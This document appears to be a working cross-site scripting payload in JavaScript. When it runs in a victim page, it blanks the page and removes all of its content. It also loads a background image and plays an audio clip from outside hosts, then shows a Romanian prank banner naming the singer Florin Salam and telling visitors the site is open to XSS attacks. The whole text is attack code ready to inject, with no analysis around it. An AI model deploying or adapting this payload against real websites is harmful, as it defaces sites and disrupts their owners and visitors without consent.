document.body.style.opacity = 0;
document.querySelector('html').style.backgroundImage = '';
document.querySelector('html').style.backgroundSize = 'auto';
document.querySelector('html').style.backgroundRepeat = 'no-repeat';
document.querySelector('html').style.backgroundImage = 'url(https://cdn.knd.ro/media/521/2861/35027/18619999/2/maxresdefault.jpg)';

new Audio('https://s0.vocaroo.com/media/download_temp/Vocaroo_s0c6P7h9F3VR.mp3').play();

do {
  document.body.removeChild(document.body.firstChild)
} while(document.body.firstChild);

document.body.style.opacity = 1;
document.body.innerHTML += `
  <br><br><br><br><br><br><br><br><br><br><br><br>
  <div id="fs" style="display: flex; justify-content: center;">
    <h1 style="margin-left: 30px; color: white; font-family: Arial;">
      Florin Salam HIT 2020 va avertizeaza: suntenti susceptibil la atacuri de tip XSS; DEDICATIE
    </h1>
  </div>
`
